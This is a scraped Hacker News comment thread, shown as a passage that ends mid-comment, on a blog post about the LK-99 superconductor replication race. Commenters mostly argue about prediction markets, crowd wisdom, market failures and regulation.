30, 2023 Posted in Blog Post navigation Previous Post Previous post:Reference Card: Cyberpunk 2077 Critical Quest Path Leave a ReplyThis site uses Akismet to reduce spam. Learn how your comment data is processed.AboutYou can call me Eiri. I’ve written guides, made games, reviewed them, dabbled in music, translation, and generally just produced a variety of content over the years.You can check the homepage for quick links, check out the blog, or read my history on the portfolio page.I also have a Patreon. Did you know it’s free now?About (2023) Fan Art Home Portfolio / History Reference Cards The Frozen Flame Eiri Sanada,Follow Design a site like this with WordPress.com Get started",
    "commentLink": "https://news.ycombinator.com/item?id=36940323",
    "commentBody": "LK-99: The Live Online Race for a Room-Temperature Superconductor (eirifu.wordpress.com)298 points by fofoz 5  269 commentsAjedi32 8 minutes ago | next [–] Whether or not this turns out to be real the whole incident has been extremely entertaining, way more than I would have expected. Replication attempts being documented in real time on Twitter and livestreamed on Twitch, news about infighting and drama among the researchers who published the paper, constant fluxations in the betting markets as new news comes out. It's been a wild ride.replym00dy 2 minutes ago | parent | next [–] welcome to the new world...It is fast, efficient and very interesting...replyTheAceOfHearts 4 hours ago | prev | next [–] Saw some people hyping up markets where people are betting on prediction markets whether or not LK-99 will replicate. Can't help but feel like that money would be better spent just paying off some labs to actually try to replicate the process.The response I got from a predictions market enthusiast was that having a sufficiently large market would motivate people to attempt to have the process replicated and buy options on the outcome once they confirm their findings in order to cash out. Which gives me strong feelings of scamming the uninformed and gullible.As for comments on LK-99 itself, I don't understand why nobody has gotten their hands on an existing sample to verify that it's legitimate. Shouldn't the minimum requirements be a magnet and the material sample, to demonstrate it floating through the meissner effect?replytoth 3 hours ago | parent | next [–] This type of instictive negative reaction to prediction markets is, unfortunately, common, but, I think, misguided.Prediction markets are one of the (or just, the?) best ways of aggregating knowledge from multiple sources and producing the best predictions. Having good legible predictions of impactful events such as LK-99 replication is extremely useful for society - it would be an invaluable input for a savvy policy maker for instance.What I think is silly is that vastly bigger amounts of money are put in betting markets for any mildly important sportsball game. Meanwhile, markets on LK99 replication, one of the most potentially important possibilities in the world right now have only on the order of hundreds of thousands of dollars in them.And there is no scamming involved. If you are participating in a prediction market, either you have some reason you believe you know something the market does not or you should expect you are simply subsidizing those with better information. The latter is a perfectly reasonable thing to do - it's not easy for an average person to \"pay off some lab\", but if they provide liquidity to the prediction market they are giving an explicit subsidy for anyone that can answer the question.replyrenlo 2 minutes ago | root | parent | next [–] > If you are participating in a prediction market, either you have some reason you believe you know something the market does not or you should expect you are simply subsidizing those with better information.Sometimes people just vote for \"their team\", similar to a sportsball fan placing a large bet on their favorite team winning, without any insider knowledge. I've seen it a couple of times on PredictIt for the more contentious predictions (presidential election being one, control of the house / senate, etc). While in the end those with better information will usually come out on top, in those kinds of markets the favored prediction doesn't align well with the data.replyalchemist1e9 3 hours ago | root | parent | prev | next [–] Absolutely and people might be interested that in this case the prediction market for LK-99 is reacting in real time to new tweets from people trying to replicate. The “yes” spike to 32c yesterday was in response to a twitter account posting an image of a levitating grain in a tube. The credibility of that replication attempt was then evaluated by many and the market backed off afterwards.There is always a subtle anti-markets theme on many HN debates, likely from highly educated ans literate posters. I believe we still in this age simply don’t provide proper education on the massive benefits that markets bring to so mang problems. They are literally the nervous system of our incredible global organic economy.In this case, why in world would you have something against prediction markets?Is it fascinating the risk of a nuclear weapon detonation by December 31st of 2023 is accessed to be around 9%?If anything we need to liberalize laws around prediction markets. Currently they are relagated to off shore and various backwaters. The CME should be listing tbese types of markets ideally and institutional money hiring top analytical talent would then participate.replymellosouls 3 hours ago | root | parent | next [–] There is always a subtle anti-markets theme on many HN debates, likely from highly educated ans literate posters. I believe we still in this age simply don’t provide proper education on the massive benefits that markets bring to so mang problemsI think we are all too aware of markets and their benefits and disbenefits.It's not clear why you think the \"education\" is missing only in one direction.replyalchemist1e9 3 hours ago | root | parent | next [–] You don’t observe a frequent knee jerk like anti-markets reaction from comments across HN?What are good examples of their “disbenefits”?replykybernetikos 1 hour ago | root | parent | next [–] I would describe myself as cautiously pro market, but I think it's hard to deny that they are effective externality seeking machines. If there is any way of providing a benefit while finding a way to impose the cost diffusely, you can bet that the market will find it. Market based systems guarantee that costs will be hidden and imposed on those who don't receive the benefit to the maximum extent possible given physics and law.On top of that, it's interesting that we only use the market concept at the meta level. Vanishingly few of the businesses that compete in the marketplace are internally arranged on market principles. Instead they follow bureaucratic and oligarchic principles internally. And when the survival of the state is on the line because of war, we don't trust markets to allocate resources to get important things built quickly - rather the state takes power to directly cause some things to be built and other things not to be.Although the market gets praised for being good at allocation of capital, I would say it's good in the way evolution is good at finding things that can survive. It might find great solutions that a planned process wouldn't, but it'll take a long time and a lot of things will die in the process.replykakwa_ 27 minutes ago | root | parent | prev | next [–] Vast topic.Markets definitely have their issues.Here are a few:* The most obvious one is the fact it's an overhead, it doesn't produce goods or services by itself. That's not a major issue, but for example in the US ~5% (~7M of ~150M) of the workforce is dedicated to this overhead.* It's prone to internal instabilities. Too often, the markets disconnect from the underlying economic reality, sometimes with only mild effects (for example, that time petroleum prices went negative), sometimes with more serious ones (2008).* It can lead to overly quantitative views, ignoring the qualitative. It's the \"metrics becoming the objective and thus compromising the value of the metric\" (example: tech stock prices).* It over-emphasizes individual interests over the collective one (think for example: environmental issues & global warming).Markets definitely have their issues. But so far, the other systems we experimented with (planned economy) were even less able to cope with the incredibly difficult task of balancing an economy.Lastly, it is to be noted that we are not operating in a pure market economy.We are in an hybrid system where States (hopefully representing their people) definitely have a lot of say in economic matters and that's probably for the better.replymschuster91 13 minutes ago | root | parent | next [–] > Markets definitely have their issues. But so far, the other systems we experimented with (planned economy) were even less able to cope with the incredibly difficult task of balancing an economy.The worst issue that the Soviets and other attempts at central planning failed to account for was flexibility and buffer. Say a natural disaster hits and you need an extra amount of concrete for reconstruction, but all the concrete production was already allocated for something else and the plan is considered sacrosanct. Or some innovation (e.g. refrigerators, cars, washing machines) proves to be way more popular than expected, but there is no way to adapt the plan, and so you had to wait years for a Trabant car.Ironically, Western-style \"free markets\" eventually converged towards the same issue with the unholy invention of \"just in time\" manufacturing. Both capitalism and communism sought to eradicate \"inefficiencies\" and destabilized their entire foundation doing so.replyeropple 1 hour ago | root | parent | prev | next [–] > What are good examples of their “disbenefits”?Overwhelmingly unaddressed externalities.replymellosouls 3 hours ago | root | parent | prev | next [–] You don’t observe a frequent knee jerk like anti-markets reaction from comments across HN?I find HN one of the most balanced online forums on most subjects.What are good examples of their “disbenefits”?The race to the bottom is all around us.replyalchemist1e9 2 hours ago | root | parent | next [–] > The race to the bottom is all around us.You live in SF by chance?Because globally and historically that’s absolutely not what the data says about markets.replymacintux 36 minutes ago | root | parent | next [–] The “bottom” is also subjective. I see small-town grocery stores everywhere in Indiana dying due to cheap Dollar General stores popping up next to them.So much for fresh fruit & vegetables, so much for the Amish bakeries that would distribute baked goods through the local groceries.But hey, cheaply-made goods from China are more widely available.replyjjoonathan 2 hours ago | root | parent | prev | next [–] Any system that is in control and doesn't actually manage to stop progress can make this claim, monarchies and socialist systems included. Capitalism is very good at maximizing the amount of money available for investment, so it probably is uniquely qualified to make a claim to be the best system for encouraging progress, but just as clearly it aggressively funnels technology down paths that are tuned for maximum value extraction and that's not something I believe is good for society as a whole, or even progress on a long enough timescale.replyalchemist1e9 45 minutes ago | root | parent | next [–] For what it’s worth, not much, but me personal believe that you believe that without evidence and primary due to the propaganda governments have fed you to scapegoat the evil “capitalists” and markets as a way to deflect blame for serious problems away from themselves.Governments need to regulate to prevent harm, we all agree. Yet they claim it’s the markets doing it! No, markets do what is most efficient and optimal given the rules they can operate within. Governments are the failure point for basically all the serious problems. Instead of making neutral evidence based rules as regulations, politicians tend to reach for redistribution to buy votes, which when combined with scapegoating markets, is a winning combination to remain in power. Unfortunately history shows, unambiguously, it’s a losing combination for the society.replyRedCondor 2 hours ago | root | parent | prev | next [–] Marketers take a lot of credit for achievements that don't belong to them.Take, for example, Hayek's rather more honest commentary on vacations and human rights generally:>[The 1948 Universal Declaration of Human Rights] is admittedly an attempt to fuse the rights of the Western liberal tradition with the altogether different concept deriving from the Marxist Russian Revolution. It adds to the list of the classical civil rights enumerated in its first twenty-one articles seven further guarantees intended to express the new ‘social and economic rights’. (…) The conception of a ‘universal right’ which assures to the peasant, to the Eskimo, and presumably to the Abominable Snowman, ‘periodic holidays with pay’ shows the absurdity of the whole thing. (…) What are the consequences of the requirement that every one should have the right ‘freely to participate in the cultural life of the community and to share in the scientific advances and its benefits’. (…) It is evident that all these ‘rights’ are based on the interpretation of society as a deliberately made organization by which everybody is employed. They could not be made universal within a system of rules of just conduct based on the conception of individual responsibility, and so require that the whole of society be converted into a single organization, that is, made totalitarian in the fullest sense of the word.https://redsails.org/concessions/The decay we witness today is simply the rollback of concessions copied from socialist states and artificially bolted onto capitalism to reduce socialist ferment. The consequences are predictable.replyalchemist1e9 2 hours ago | root | parent | next [–] I see. So this is about “the right” to take a vacation? What are you talking about and what am I? we seem to live in different realities. I can’t even imagine somehow I would have a government “right” to take a vacation. Who is paying for it? I don’t get it.replybazzargh 40 minutes ago | root | parent | next [–] https://en.wikipedia.org/wiki/Annual_leave#Leave \"Most countries have labour laws that mandate employers give a certain number of paid time-off days per year to workers.\" (it goes on to point out that the USA - with the exception of Maine and Nevada - is the outlier in western industrial nations in not having this)The \"right\" is also in the Universal Declaration of Human Rights and International Covenant on Economic, Social and Cultural Rights; see https://en.wikipedia.org/wiki/Right_to_rest_and_leisureIronically, a lot of this dates back to the Haymarket Riot in Chicago in May 1886 (over the eight-hour-day movement), which led to May Day being a worker's holiday in much of the world...but US politics meant they got an alternative holiday in September.As RedCondor points out, \"who pays for it\" has it backwards, companies gain value from the work of their employees, so effectively it is just giving back some of what they \"pay\" the company in labour.replybrookst 55 minutes ago | root | parent | prev | next [–] Do you think you have a right to take breaks at work? To go to the bathroom? To a safe work environment?People aren’t machines. We have a complicated social contract that says companies may employ labor so long as they meet certain requirements for safety, health, and treatment.It’s not unreasonable to see time off as part of the deal. Who’s paying for your bathroom breaks? Same answer.replyRedCondor 1 hour ago | root | parent | prev | next [–] All so-called \"capital returns\" are in reality produced by working people, and therefore people get to democratically decide what they do with them, through whatever decision-making forms they politically choose and consent to organize themselves under.Insofar as there are disagreements, because capitalist \"geniuses\" don't think their riches should be subject to democracy, we have a struggle between socialism and capitalism.replyalchemist1e9 31 minutes ago | root | parent | next [–] Except history shows us that in 100% of the cases that working people seize the production and allocate the gains they do a unbelievable bad job. Socialism is the single most failed idea in human history, yet we refuse to properly teach that in our education system. I suspect in the future it will be view a bit like refusing to teach other scientific subjects, like evolution.In reality a mob of people end up producing nothing without capitalists and markets. There is a joke that the IQ of a mob is roughly the highest IQ in the mob divided by the size of the mob.replyRedCondor 21 minutes ago | root | parent | next [–] Cool joke.I encourage anyone on the fence between this libertarian and I to read the \"Concessions\" essay I linked up above.concordDance 2 hours ago | root | parent | prev | next [–] > The race to the bottom is all around us.Isn't this more a side effect of corporations, advertising and corruption rather than markets themselves?replypolygamous_bat 2 hours ago | root | parent | next [–] To some, they're the same thing.replyajuc 1 hour ago | root | parent | prev | next [–] Child labor.Slave trade.Sweatshops.1000 different environmental catastrophes.You know, the reasons we have regulation. We had markets FIRST, then we got regulation on top of that, and we never looked back.replyalchemist1e9 52 minutes ago | root | parent | next [–] Absolutely government’s fundamental role in human society is regulating against harm.But somehow the narrative is markets are “bad”, they obviously aren’t as they seek out information and efficiency, which is a good thing. Markets are the one’s you should thank for telling you child labor, slaves, and sweatshops are a problem, and the environment issue, so you pressured your government to regulate those issues. Without free markets the alternative would be the government doing all those horrible things, which btw they certain used to.People are mixed up, the primary problem is government failure to regulate and be transparent. It’s very difficult for governments to admit they create the problems so academics and politicians find the boggy man of markets.Kennedy understands this topic well and while it’s unlikely he will win, I deeply hope he can somehow.We need more markets for more things with clear and clean regulations build based on empirical evidence and scientific and not created by lobbyists involved in regulatory capture.replyajuc 45 minutes ago | root | parent | next [–] > But somehow the narrative is markets are “bad”The mainstream opinion is \"markets are ok as long as they are well regulated\".The only narrative that is trying to compete with that with any success is \"markets are perfect without any regulation\". Which provokes the rebuttal you refer to.I've yet to see anybody claiming seriously that \"markets are inherently bad and can't be saved\". Even in communism there were markets, as abysmal as that system was (and I lived in a communist country for 6 years).If our markets right now were regulated enough - we wouldn't have global warming problems. Clearly there's a lot of externalities that aren't priced-in. So - there's too much market and too little regulation.replyalchemist1e9 29 minutes ago | root | parent | next [–] We likely actually agree.The issue is politicians tend to push redistribution and direct action of the government over rules and regulations.replyTuring_Machine 53 minutes ago | root | parent | prev | next [–] All of those things, including environmental catastrophes, existed for millennia before Adam Smith came along.replyajuc 47 minutes ago | root | parent | next [–] So did markets.replyBluestrike2 2 hours ago | root | parent | prev | next [–] Any number of the many, many, negative externalities[0], where market transactions are unable or unwilling to capture the often serious negative effects of an activity in its price, that have been documented and researched by economists over the years? Air pollution and greenhouse gases are just two of the biggest examples, with absolutely massive external costs that are not captured in the price. There are even positive externalities with various activities where societal benefits can't be captured in the price.Regulatory capture[1] and rent-seeking are also examples where markets can fail. There are plenty of others.Markets are just tools for the exchange of economic activity. Nothing more, nothing less. But as a society, we tend to ascribe all sorts of greater meaning to them that make it harder to recognize where they come up short and actually do something about it. If knee-jerk anti-market reactions are bad, then might I propose that knee-jerk pro-market reactions are just as bad, insofar as they gloss over or outright ignore the negative aspects of markets as we've implemented them?Imagine a screwdriver. It does one job: turn a screw. If you have the right one, matched with the corresponding screw drive--let's just assume a Philips screw--at the right size, it does its job perfectly. But it'll get less effective as the tip and screw sizes diverge. What about other screw drives? There are a bunch of types where a Philips will sort of fit, and you'll probably be able to turn the screw, albeit with more effort and a greater likelihood of camming out and damaging the screw or your screwdriver. A flat-head screwdriver gets used and abused in all sorts of fun and interesting ways. You can use a flat-head screwdriver to pry open a can of paint, but an actual paint can opener is still less likely to distort or damage the lid or slip and injure you. At some point, you open the tool box and grab another tool. Maybe it's another screwdriver, because you're turning another screw. Or maybe it's a different tool altogether, one designed for the specific task at hand.Markets aren't so different, if not quite as narrowly-defined as a screwdriver. They work well in some areas, less well in others, and in some, they simply can't function. All to varying degrees. Recognizing their failures and limitations allows us try and develop policies that address their worst parts while maintaining their more desirable parts.0. https://en.wikipedia.org/wiki/Externality1. https://en.wikipedia.org/wiki/Regulatory_capturereplyalchemist1e9 1 hour ago | root | parent | next [–] For the record I believe I agree with you. However I view it as governments are the failure point in the issues you list, not markets. They have outright failed to address the negative externalities as they have been captured by private interests. In my opinion the entire financial system is captured and the regulations they tend to introduce are simply to allow the corrupt private entities further control.One neat part of anonymous online prediction markets using unregulated digital currencies is how they exist outside this crony capitalist system.It’s not markets to blame. It’s bad government!replyguru4consulting 1 hour ago | root | parent | prev | next [–] Agreed. Stock markets are very similar to prediction markets. They are priced based on future projections, technical feasibility and probability of achieving certain milestone, ability to reach market first, internal and external factors, etc. I don't see much difference between a prediction market and a stock market. Theoretically, we could allow both of them and treat them similar. But one major risk I see is that big players can influence it with big money and distort the reality. It becomes a casino, just like the current wall street. Right now, most of the participants in prediction markets are likely knowledgeable in the subject area, or even subject matter experts and it's probably better to leave it that way.replyKingOfCoders 18 minutes ago | root | parent | next [–] \"attempt to have the process replicated and buy options on the outcome once they confirm their findings in\"This is called insider trading in stock markets and illegal. So your analogy breaks.replycroes 3 hours ago | root | parent | prev | next [–] Because markets aren't nearly as clever as is always claimed.Lehmann Brothers anyone?replyalchemist1e9 2 hours ago | root | parent | next [–] More like governments aren’t as clever as claimed. The markets would have put all the bad actors out of business permanently and redistributed the resources (like shinny new buildings and engineers) to areas where they would better be utilized.Instead it was turned into an opportunity to launder money at planetary scale.This likely hints to why the truth about the benefits of brutally efficient free markets is distorted in education, it would require the teaching of the remarkable incompetence of collectivism and governments! which we know who won’t like that.replyrcxdude 2 hours ago | root | parent | next [–] Markets are perfectly capable of rewarding bad actors for a very long time. even if they eventually converge towards reality it's not something that you should assume about a market in any given situation (for one thing, a market is only reflecting the opinions of others about a thing, not the reality of the thing. Even if you think the opinions are on average wrong you don't make money by finding the reality, but by predicting when and how the opinions will change).I think markets are an extremely useful decision tool in a lot of circumstances but they do still have many failure modes which aren't related to not being 'free enough' (especially w.r.t. regulation it can in fact make markets more efficient as opposed to less, depending on the regulation and the market).replyfallingknife 2 hours ago | root | parent | next [–] What system isn't capable of rewarding bad actors for a long time?replyethbr0 1 hour ago | root | parent | next [–] Random allocation.replyalchemist1e9 40 minutes ago | root | parent | next [–] Which then erases all information.replycmilton 2 hours ago | root | parent | prev | next [–] At what cost though? Surely the wealthy will continue on like nothing ever happened while the rest of us are here holding the bag.Markets seem to benefit some much more than others. Not everyone wants to play this game.replyalchemist1e9 2 hours ago | root | parent | next [–] I was there and know all the details what happened and you nailed the key point, they used fear to have you believe what you wrote.I remember Paulson talking about how ATMs would fail. AIG won’t pay it’s policies. The US equities would crash even further. I hate to tell you but ALL lies, blatant “misinformation” as the new term is.They needed you to be terrified to save their own skins. Blackrock became the largest landlord in the country afterwards. The very companies that facilitated and promoted and literally caused the bubble and crash were rewarded.The waitress and mechanic couple with a baby who had carefully saved up $30K never got the opportunity to buy that house down the street from their parents for $90K at foreclosure from the bankrupt banks. Nope, Blackrock exchanged their bad paper, worth, 20c for $1 to your very government for new fresh cash, bought it instead at $120K, down from $150K.Go crony capitalism! Which isn’t what markets are about.replysgt101 2 hours ago | root | parent | prev | next [–] A perfect market would do this, but it would also suffer from other well documented problems.. the markets we have are very far from disinterested allocation optimization systems.replycroes 1 hour ago | root | parent | prev | next [–] Don't act like markets and government are independent entities. The markets influenced the government in their favor long before Lehmann brothers and they did the same afterwards.The markets you think of are as possible as working communism.replymcphage 55 minutes ago | root | parent | prev | next [–] That’s a pretty clever trick you got there. First you take all of the problems inherent to markets. And then you say “actually it’s the government’s job to fix that, and they’re doing a terrible job”—which you then turn around and use as a justification for more markets and less government!replykibwen 2 hours ago | root | parent | prev | next [–] \"Real capitalism has never been tried.\"replyeropple 1 hour ago | root | parent | next [–] And, of course, cannot fail--only be failed.replymorelisp 2 hours ago | root | parent | prev | next [–] Looking past your \"rah rah financialization\" partisanship, one question:Why is a prediction market for replication per se more interesting than the existing market of all the public companies who would be enriched / wiped out based on the result?(Note that \"well, the effect would be too small\" flips just as easily around to, the smaller markets are obviously way too noisy given what people are actually getting away with...)replyconcordDance 2 hours ago | root | parent | next [–] More directly about the actual issues policy makers care about, so you lose less info to confounders.replymorelisp 2 hours ago | root | parent | next [–] Markets are perfect except when they don't capture \"actual issues\" and then you need different markets with different participants? How does this support market primacy?replyalchemist1e9 2 hours ago | root | parent | prev | next [–] What are people getting away with exactly? Prediction markets more rapidly expose fraud and misinformation than without them.Generally the decision to list a market or contract is based on providing specific utility and information. They provide a better signal to noise and therefore provide risk management as well.The fact you believe markets are a “partisan” topic illustrates exactly the problem. They are objectively and scientifically an important and critical part of humanity, which isn’t taught.As I’ve said elsewhere there reason is obvious as in teaching such facts and information will require simultaneously teach about how horrific and harmful governments have been, and we know who won’t like that.replymorelisp 2 hours ago | root | parent | next [–] Exposing fraud you created the environment for is not particularly interesting.replyalchemist1e9 2 hours ago | root | parent | next [–] Oh so fraudulent SC claims would have no better avenues without prediction markets? I’d argue they would have more and with more capacity not less!replytomjen3 1 hour ago | root | parent | prev | next [–] Prediction markets got Donald Trump wrong on the election night and Brexit too[0].Given such a huge failure why should we care what they say?[0]: https://archive.li/7m8s6replybitshiftfaced 55 minutes ago | root | parent | next [–] Weren't they still much better than what many media experts were forecasting? Iirc, CNN put Clinton at 97%.replybrookst 52 minutes ago | root | parent | prev | next [–] Are you saying they are no better than chance? Or just that they are not 100% perfect?Because we should deeply care about any source of information that beats chance, even if it is imperfect.replythrow0101a 3 hours ago | root | parent | prev | next [–] What do these prediction markets produce? Some people are saying \"yes\" and others are saying \"no\", and the answer is either \"yes\" or \"no\", but why bother spending money on predicting when society can spend money on replicating it? Wouldn't an actual replication attempt be more useful?> The latter is a perfectly reasonable thing to do - it's not easy for an average person to \"pay off some lab\", but if they provide liquidity to the prediction market they are giving an explicit subsidy for anyone that can answer the question.Is any of this liquidity going to actual (replication) research, because if it is not, again: what are these markets tangibly producing? Moving a bunch of numbers around a ledger does not seem very useful.replytinco 3 hours ago | root | parent | next [–] They're producing the wisdom of the crowd, which is a real and highly accurate piece of information. It's quite difficult and expensive to produce information as fast and reliable by other means. And they don't cost much, it's mostly money being moved around.edit: I interpreted it as asking wether prediction markets in general produce value. In this specific case I'm 100% with you, they're absolutely useless in predicting wether this finding is going to replicate or not.BTW probably 100% useless is going to be better than trusting a single reply in a HN thread. Even averaging out a group of replies on HN is going to be pretty bad, probably worse than averaging out a group of replies on Reddit.The idea of wisdom of the crowd is based on the idea that knowledge about a topic (both false and true) is roughly normally distributed (as many things are in nature), so the averaged result of a large group of answers is likely to be close to the real answer, as long as there are no external factors pushing the whole distribution left or right.Also, the final result is not going to be the answer if it's gonna replicate, but more the odds of it replicating (i.e. the odds of a paper like this being legit). The odds could be 1 in a million, and it still wouldn't affect the reality of LK-99 being super conductive or not.replydiscreteevent 2 hours ago | root | parent | next [–] The opinion of a crowd is \"real and highly accurate\"? The opinion of crowds is frequently completely disconnected from reality. Crowds are often an amplifier of individual delusion. As for accuracy, the only thing the opinion of a crowd is accurate about is the opinion of that particular crowd (not even \"the crowd\" - look at election polling)replynaasking 59 minutes ago | root | parent | next [–] The wisdom of the crowds works given a large and diverse sample of independent predictors. People who don't know anything about a topic will vote randomly so their votes effectively cancel each other out, but people who know more about a particular topic will be biased towards correct answers.replyhutzlibu 3 hours ago | root | parent | prev | next [–] \"They're producing the wisdom of the crowd, which is a real and highly accurate piece of information.\"I have strong doubts, that the wisdom of the crowd here is competent in judging whether a revolutionary new superconductor is real, or not.replyjonmumm 1 hour ago | root | parent | next [–] what's an alternative that is better?replygilleain 1 hour ago | root | parent | prev | next [–] Have you heard the one about the Emperor of China's nose?https://imaginatorium.org/stuff/nose.htmBasically, making an average of a large number of estimates of an unknown value will (of course) fail if most/none of the estimators have any idea of the actual value being estimated.replytinco 1 hour ago | root | parent | next [–] I don't think I've seen that before. But the article you linked doesn't make the conclusion you suggest at all, instead they pose a corrected value. If indeed no one estimating had no information at all, the average length of Chinese person's nose would be close to that corrected value.It's the same with this topic. You won't get an answer to the question \"Is this particular paper true or not?\" but you'll get an answer to the question \"Are papers submitted under these circumstances making claims like this likely to be true?\". The crowd will only answer the question they can answer. I think that's from \"Thinking fast and slow\".replygilleain 53 minutes ago | root | parent | next [–] It's not well explained in the version I linked (apologies, I should have looked for a clearer version).The point of the story when I originally heard it is that no one has SEEN the Emperor's nose. So any statistical function (like averaging) of estimates is totally useless as they are all guesses.No one has seen 'papers submitted under these circumstances' so no amount of 'crowd wisdom' will make any difference.Also, as an aside the idea that 'the crowd will only answer the question they can answer' is ... bizarre. People will answer anything you ask them, and you have no way to know if they are just making it up.replyethbr0 1 hour ago | root | parent | prev | next [–] > most/none of the estimators have any idea of the actual value being estimated.A subtle distinction is who is allowed to participate in a prediction market.\"Everyone with $1\" is a terrible answer, and produces the bad results people are pointing to.Financial markets avoid this because of their scale, where there's enough smart money to (usually) punish stupid money.Absent that scale, it's just stupid money muddling the decisions of smart money.Prediction markets with a knowledge barrier to entry would produce better results.replygilleain 49 minutes ago | root | parent | next [–] How would you construct such a knowledge barrier? Another prediction market?Also, suggesting that there is such a thing as 'smart' money - presumably due to having more of it? - is amusing. As pointed out elsewhere in this discussion, there has been a lot of smart money acting particularly dumb over the last few years.replyMLH6ft1 3 hours ago | root | parent | prev | next [–] \"They're producing the wisdom of the crowd\"Yeah we saw how wise was the crowd's wisdom with crypto.replynonethewiser 2 hours ago | root | parent | prev | next [–] So practically speaking, what can you do with the fact that X% of fans (because people betting are enthusiasts) think LK-99 will reproduce and Y% think it wont?replytinco 1 hour ago | root | parent | next [–] You assume all the people betting are enthusiasts. The theory of prediction markets is that rational actors in the market will recognise that a portion of the betters is overhyped and adjust their bets to make use of their irrational behaviour.If the rational actors are actually effective at making such adjustments I don't know, I bet there's statistics out there on how well prediction markets correlate with reality.In any case, even if the market was perfect, it wouldn't tell us if LK-99 would reproduce, which I guess is the meat of your question. It would just tell us how likely it is that an experimental result made under those specific circumstances would reproduce. And what you could do with that information depends on what your answer to the question: \"How would I be affected if LK-99 would reproduce?\" would be.If you're a big energy business leader, and you want to filter what topics to spend your valuable time on maybe you could set a rule that you only want spend time reading scientific papers that have >10% odds of being legit.More realistically though, I think things like prediction markets are mostly useful to traders who are trying to arbitrage things like resource markets. What's the price of copper going to do when this turns out to be true? You could adjust your futures based on that.replycivilitty 2 hours ago | root | parent | prev | next [–] There is literally zero wisdom in the crowd about a brand new just discovered material that’s only ever been produced by one small group by definition.This market fetishism is out of control.replynaasking 42 minutes ago | root | parent | next [–] That's not correct. Condensed matter physicists will have a good handle on how plausible this is (but not certain). Other people will vote randomly so their votes cancel out, effectively leaving the final result as biased by the expert opinions. That's how the wisdom of the crowd works.replynaasking 1 hour ago | root | parent | prev | next [–] > What do these prediction markets produce? Some people are saying \"yes\" and others are saying \"no\", and the answer is either \"yes\" or \"no\", but why bother spending money on predicting when society can spend money on replicating it? Wouldn't an actual replication attempt be more useful?They are producing predictions of future value. It's not clear when you're only considering a single case, but what if you only have enough money to fund two projects and you have 15 applicants? You could pay a panel of experts to evaluate them and now you can only fund one project, or you can exploit the prediction market and fund the projects that seem to have the best chance of success according to the crowd. So in effect, the crowd is funding projects by freeing up funds that would otherwise go towards bureaucracy.The wisdom of the crowds works given a large and diverse sample of independent predictors. People who don't know anything will vote randomly so their votes effectively cancel each other out, but people who know more about a particular topic will be biased towards correct answers.replyfallingknife 1 hour ago | root | parent | prev | next [–] In what way would the people in the prediction markets fund a replication? That's not something that normal people just do. And if I wanted to do that, I don't even know how.And society doesn't spend money. People do.replyRetric 3 hours ago | root | parent | prev | next [–] The issue is there’s zero utility in aggregating knowledge on LK-99 as apposed to simply running these experiments. It’s going to take weeks not decades for someone to replicate it.Markets are useful when people act more efficiently based on the information, but there’s no efficiency to be gained here.replyTurskarama 3 hours ago | root | parent | prev | next [–] LK-99 is a brand new material that almost nobody knows anything about. The market is not a knowledge aggregate, it is vibes based.replyjapoco 2 hours ago | root | parent | next [–] You are severely underestimating how good vibes from a lot of people are at giving good estimates.replyevgen 2 hours ago | root | parent | next [–] They are actually only good if the members of that crowd have some sort of empirical experience with the problem they are being asked to solve. Guess the number of coins in a jar? People know coins and have experience packing things in a limited volume to the crowd has a hope of being wise. Guess an obscure materials science and physics result? Not a chance, the crowd is worthless.replypolygamous_bat 2 hours ago | root | parent | prev | next [–] > You are severely underestimating how good vibes from a lot of people are at giving good estimatesAnyone else remembers how people were selling and buying doge coin at 70 cents based on good vibes? No? Ok.replyTurskarama 2 hours ago | root | parent | prev | next [–] There has to be _some_ level of knowledge to base it off though, this is just hope.replytinco 3 hours ago | root | parent | prev | next [–] Not to take away from your point, but there is a better way than prediction markets, and that's careful objective research by non-experts (https://goodjudgment.com/).It's been shown that teams of such researchers consistently beat prediction markets on these sorts of topics. Anecdotal evidence suggests it might be that the presence of experts and cultural preconceptions corrupt prediction markets enough to diverge the result from the \"wisdom of the crowd\" effect.replyseppel 3 hours ago | root | parent | next [–] > It's been shown that teams of such researchers consistently beat prediction markets on these sorts of topics.This sounds like free money.replytinco 1 hour ago | root | parent | next [–] Running prediction markets is probably more free money than that. Building and maintaining research teams like that is not easy or cheap, if it would be then Good Judgment Inc. would be rolling in cash.Edit for context: Good Judgement Inc. is a sort of consultancy firm formed based on the results of an experiment called \"The good judgment project\" where psychologists challenged a community to predict (geopolitical) events. By structuring it as a team based tournament they figured out a list of qualities/rules that would make an individual or theme very good at accurately predicting events. The teams that followed these rules outperformed prediction markets. Following the rules is basically a full time commitment.The list is here, go get your free money: https://goodjudgment.com/philip-tetlocks-10-commandments-of-...replysgregnt 2 hours ago | root | parent | prev | next [–] > it has been shown ...Can you please share your sources?replysocial_quotient 3 hours ago | root | parent | prev | next [–] I agree with you and think it parallels the equity market a bit.Stock prices embody the market's collective knowledge, expectations, and emotions about a company's current and future value.And to your point if you are blindly investing or blindly buying via instruments like ETFs you can end up subsidizing those with more/better information.replyamelius 2 hours ago | root | parent | prev | next [–] Counterargument. Prediction markets could also be used to hedge.E.g. if you invest in technology around LK-99, and then use prediction market to prevent going bankrupt in case you were wrong.THUS: it doesn't mean that prediction markets give good predictions.By the way. Do you have some data on that? I.e., statistics of prediction markets being right vs wrong?replytwoodfin 2 hours ago | root | parent | next [–] The hedge is still a signal of the degree of risk you ascribe to the possibility your technology won’t work.replyamelius 1 hour ago | root | parent | next [–] If I invest in technology (hoping it will work) but use the prediction market to hedge in case the technology won't work, how does that tell anyone watching the prediction market that people have net positive feelings about the technology?replytwoodfin 25 minutes ago | root | parent | next [–] If you were 100% confident you wouldn’t hedge at all. If you’re 80% confident you’d hedge less than if you were only 60% confident.This all translates into an price signal if the market is functioning and liquid.replyscotty79 2 hours ago | root | parent | prev | next [–] > Prediction markets are one of the (or just, the?) best ways of aggregating knowledge from multiple sources and producing the best predictions.They would be true if people with most money and appetite for risk were also the most knowledgeable and smart.They are not. As you can easily tell from recent coverage of idiocy of even the richest people who have propensity for big bets.It has been researched and discovered that people with more money do not make smarter bets than those with far less. So at best, looking at prediction markets, gives you exactly as much knowledge as polling random people on the streets and asking them what would they bet on.replydanparsonson 1 hour ago | root | parent | next [–] This exactly - the idea that a whole load of well informed people are driving a prediction market is about as realistic as saying that crypto investors are all experts in economics.replydist-epoch 3 hours ago | root | parent | prev | next [–] How about this scenario:I am the PI of a laboratory. I buy up the market and (falsely) announce that I succeeded in replication. Sell and make profit. Then a couple of days later I announce that I made a terrible mistake.How do you prevent this scenario? I did nothing illegal, I just \"not 